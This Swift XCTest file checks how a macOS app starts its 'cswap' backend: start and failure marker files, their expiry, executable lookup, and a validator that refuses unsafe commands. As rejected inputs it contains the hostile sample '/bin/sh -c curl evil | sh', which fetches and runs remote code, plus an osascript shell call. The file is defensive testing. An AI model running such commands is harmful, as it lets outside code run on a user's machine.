import XCTest

/// "Start backend": the URL, the host's start marker, "Starting…", and how
/// the host finds cswap.
final class BackendStartTests: XCTestCase {
    private let now = Date(timeIntervalSince1970: 1_789_891_428)

    func testStartURL() {
        XCTAssertEqual(BackendStart.url.absoluteString, "claudeswap://start-backend")
        XCTAssertTrue(BackendStart.isStartURL(BackendStart.url))
        XCTAssertTrue(BackendStart.isStartURL(URL(string: "ClaudeSwap://Start-Backend")!))
        XCTAssertFalse(BackendStart.isStartURL(URL(string: "claudeswap://switch")!))
        XCTAssertFalse(BackendStart.isStartURL(URL(string: "https://start-backend")!))
    }

    func testMarkerIsADotfileTheBackendLeavesAlone() {
        XCTAssertTrue(BackendStart.markerName.hasPrefix("."))
    }

    func testMarkerRoundTrips() {
        XCTAssertEqual(String(bytes: BackendStart.marker(at: now), encoding: .utf8),
                       #"{"at":"2026-09-20T08:03:48Z"}"#)
        XCTAssertEqual(BackendStart.markerDate(BackendStart.marker(at: now)), now)
        XCTAssertNil(BackendStart.markerDate(Data("junk".utf8)))
    }

    func testMarkerWriteGoesThroughADotTemp() throws {
        let dir = FileManager.default.temporaryDirectory.appending(path: UUID().uuidString)
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: false)
        defer { try? FileManager.default.removeItem(at: dir) }
        try RequestDrop.write(BackendStart.marker(at: now), name: BackendStart.markerName, into: dir)
        XCTAssertEqual(try FileManager.default.contentsOfDirectory(atPath: dir.path), [".backend-starting"])
    }

    func testStartingWhileYoungAndStillStale() {
        let marker = now
        XCTAssertTrue(BackendStart.isStarting(markerAt: marker, snapshotStale: true, now: now.addingTimeInterval(3)))
        XCTAssertFalse(BackendStart.isStarting(markerAt: marker, snapshotStale: true, now: now.addingTimeInterval(30)))
        // A fresh snapshot resolves it at once.
        XCTAssertFalse(BackendStart.isStarting(markerAt: marker, snapshotStale: false, now: now.addingTimeInterval(3)))
        XCTAssertFalse(BackendStart.isStarting(markerAt: nil, snapshotStale: true, now: now))
    }

    func testExpiry() {
        XCTAssertEqual(BackendStart.expiry(markerAt: now, now: now.addingTimeInterval(5)), now.addingTimeInterval(30))
        XCTAssertNil(BackendStart.expiry(markerAt: now, now: now.addingTimeInterval(30)))
        XCTAssertNil(BackendStart.expiry(markerAt: nil, now: now))
    }

    // MARK: - Failed start

    private let failure = BackendStart.FailureNote(failedAt: Date(timeIntervalSince1970: 1_789_891_428),
                                                  reason: "`cswap service start` exited with status 1.")

    func testFailureMarkerRoundTrips() {
        let data = BackendStart.failureMarker(failure)
        XCTAssertEqual(String(bytes: data, encoding: .utf8),
                       #"{"at":"2026-09-20T08:03:48Z","reason":"`cswap service start` exited with status 1."}"#)
        XCTAssertEqual(BackendStart.failureNote(data), failure)
        XCTAssertNil(BackendStart.failureNote(Data("junk".utf8)))
        // A marker without a reason still says a start failed.
        XCTAssertEqual(BackendStart.failureNote(Data(#"{"at":"2026-09-20T08:03:48Z"}"#.utf8)),
                       BackendStart.FailureNote(failedAt: now, reason: ""))
    }

    func testStateShowsTheFailureUntilItAgesOut() {
        func state(_ seconds: TimeInterval, marker: Date? = nil, stale: Bool = true) -> BackendStart.StartState {
            BackendStart.state(markerAt: marker, failure: failure, snapshotStale: stale,
                               now: now.addingTimeInterval(seconds))
        }
        XCTAssertEqual(state(1), .failed(reason: failure.reason))
        XCTAssertEqual(state(179), .failed(reason: failure.reason))
        XCTAssertEqual(state(180), .idle)
        // A fresh snapshot means the backend is up: nothing to report.
        XCTAssertEqual(state(1, stale: false), .idle)
        // A retry under way wins over the failure it is retrying.
        XCTAssertEqual(state(1, marker: now.addingTimeInterval(1)), .starting)
    }

    func testStateWithoutMarkersIsIdle() {
        XCTAssertEqual(BackendStart.state(markerAt: nil, failure: nil, snapshotStale: true, now: now), .idle)
        // A marker left behind by a host that died mid-start ages out.
        XCTAssertEqual(BackendStart.state(markerAt: now.addingTimeInterval(-600), failure: nil,
                                          snapshotStale: true, now: now), .idle)
    }

    func testExpiryTakesTheNearerMarker() {
        XCTAssertEqual(BackendStart.expiry(markerAt: now, failure: failure, now: now.addingTimeInterval(5)),
                       now.addingTimeInterval(30))
        XCTAssertEqual(BackendStart.expiry(markerAt: now, failure: failure, now: now.addingTimeInterval(35)),
                       now.addingTimeInterval(180))
        XCTAssertNil(BackendStart.expiry(markerAt: now, failure: failure, now: now.addingTimeInterval(180)))
    }

    // MARK: - Finding cswap

    private func snapshot(_ command: [String]?) -> Data {
        var object: [String: Any] = ["schemaVersion": 1]
        if let command { object["cswapCommand"] = command }
        return try! JSONSerialization.data(withJSONObject: object) // swiftlint:disable:this force_try
    }

    /// Every path is 0755 unless named otherwise.
    private func modes(_ overrides: [String: Int] = [:]) -> (String) -> Int? {
        { overrides[$0] ?? 0o755 }
    }

    func testSnapshotCommandWins() {
        let python = ["/Users/u/.local/pipx/venvs/claude-swap/bin/python", "-m", "claude_swap"]
        XCTAssertEqual(BackendStart.cswapCommand(snapshot: snapshot(python), home: "/Users/u",
                                                 isExecutable: { _ in true }, mode: modes()), python)
        let script = ["/Users/u/.local/bin/cswap"]
        XCTAssertEqual(BackendStart.cswapCommand(snapshot: snapshot(script), home: "/Users/u",
                                                 isExecutable: { _ in true }, mode: modes()), script)
    }

    func testFallsBackInOrderWhenTheSnapshotNamesNone() {
        let installed: Set = ["/opt/homebrew/bin/cswap", "/usr/local/bin/cswap"]
        XCTAssertEqual(BackendStart.cswapCommand(snapshot: snapshot(nil), home: "/Users/u",
                                                 isExecutable: installed.contains, mode: modes()),
                       ["/opt/homebrew/bin/cswap"])
        XCTAssertEqual(BackendStart.cswapCommand(snapshot: nil, home: "/Users/u",
                                                 isExecutable: { $0 == "/Users/u/.local/bin/cswap" },
                                                 mode: modes()),
                       ["/Users/u/.local/bin/cswap"])
    }

    func testIgnoresACommandThatIsNotAnAbsoluteExecutable() {
        let installed: Set = ["/usr/local/bin/cswap"]
        XCTAssertEqual(BackendStart.cswapCommand(snapshot: snapshot(["cswap"]), home: "/Users/u",
                                                 isExecutable: { _ in true }, mode: modes()),
                       ["/Users/u/.local/bin/cswap"])
        XCTAssertEqual(BackendStart.cswapCommand(snapshot: snapshot(["/gone/cswap"]), home: "/Users/u",
                                                 isExecutable: installed.contains, mode: modes()),
                       ["/usr/local/bin/cswap"])
        XCTAssertNil(BackendStart.cswapCommand(snapshot: snapshot([]), home: "/Users/u",
                                               isExecutable: { _ in false }, mode: modes()))
    }

    // MARK: - What the host app may exec

    func testAcceptsOnlyTheShapesTheBackendPublishes() {
        // `resolve_program()` writes one of exactly these two.
        XCTAssertTrue(BackendStart.isAcceptableCommand(["/opt/homebrew/bin/cswap"], mode: modes()))
        XCTAssertTrue(BackendStart.isAcceptableCommand(["/Users/u/venv/bin/python3.13", "-m", "claude_swap"],
                                                       mode: modes()))
        // An arbitrary program, or extra argv on the interpreter shape.
        XCTAssertFalse(BackendStart.isAcceptableCommand(["/usr/bin/osascript", "-e", "do shell script \"x\""],
                                                        mode: modes()))
        XCTAssertFalse(BackendStart.isAcceptableCommand(["/bin/sh", "-c", "curl evil | sh"], mode: modes()))
        XCTAssertFalse(BackendStart.isAcceptableCommand(["/usr/bin/python3", "-m", "claude_swap", "-c", "x"],
                                                        mode: modes()))
        // cswap by name only, and not relative.
        XCTAssertFalse(BackendStart.isAcceptableCommand(["/tmp/cswap-not"], mode: modes()))
        XCTAssertFalse(BackendStart.isAcceptableCommand(["cswap"], mode: modes()))
        XCTAssertFalse(BackendStart.isAcceptableCommand([], mode: modes()))
    }

    func testRejectsAnExecutableOthersCanRewrite() {
        let path = "/opt/homebrew/bin/cswap"
        XCTAssertFalse(BackendStart.isAcceptableCommand([path], mode: modes([path: 0o775])))
        XCTAssertFalse(BackendStart.isAcceptableCommand([path], mode: modes([path: 0o777])))
        XCTAssertFalse(BackendStart.isAcceptableCommand([path], mode: { _ in nil }))
        XCTAssertTrue(BackendStart.isAcceptableCommand([path], mode: modes([path: 0o700])))
    }

    func testARejectedSnapshotCommandFallsBackInsteadOfRunning() {
        XCTAssertEqual(BackendStart.cswapCommand(snapshot: snapshot(["/bin/sh", "-c", "curl evil | sh"]),
                                                 home: "/Users/u", isExecutable: { _ in true }, mode: modes()),
                       ["/Users/u/.local/bin/cswap"])
    }
}
